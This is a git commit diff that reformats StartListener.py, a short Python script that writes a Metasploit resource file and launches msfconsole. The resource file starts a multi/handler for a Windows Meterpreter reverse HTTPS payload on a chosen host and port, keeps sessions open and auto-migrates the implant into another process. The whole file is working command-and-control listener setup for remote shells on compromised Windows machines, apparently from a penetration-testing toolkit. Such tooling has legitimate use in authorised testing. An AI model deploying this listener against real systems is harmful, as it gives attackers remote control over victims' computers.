357812202f3f42f904119d071c74b915c275e8b2
Chris Campbell <obscuresec@gmail.com>
2013-08-14 11:40:28 -0400

    Update StartListener.py

--- StartListener.py
+++ StartListener.py
@@ -9,24 +9,21 @@ import subprocess
 
 #write a resource file and call it
 def build(lhost,lport):
-  options = "use multi/handler\n"
-	options += "set payload windows/meterpreter/reverse_https\n"
-	options += "set LHOST %s\nset LPORT %s\n" % (lhost,lport)
-	options += "set ExitOnSession false\n"
-	options += "set AutoRunScript post/windows/manage/smart_migrate\n"
-	options += "exploit -j\n"
-	filewrite = file("listener.rc", "w")
-	filewrite.write(options)
-	filewrite.close()
-	subprocess.Popen("/opt/metasploit/app/msfconsole -r listener.rc", shell=True).wait()
+    options = "use multi/handler\n"
+    options += "set payload windows/meterpreter/reverse_https\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
+    options += "set ExitOnSession false\nset AutoRunScript post/windows/manage/smart_migrate\nexploit -j\n"
+    filewrite = file("listener.rc", "w")
+    filewrite.write(options)
+    filewrite.close()
+    subprocess.Popen("/opt/metasploit/app/msfconsole -r listener.rc", shell=True).wait()
 
 #grab args
 try:    
-	lhost = sys.argv[1]
-	lport = sys.argv[2]
-	build(lhost,lport)
+    lhost = sys.argv[1]
+    lport = sys.argv[2]
+    build(lhost,lport)
 
 #index error
 except IndexError:
-	print "python StartListener.py lhost lport"
+    print "python StartListener.py lhost lport"
 
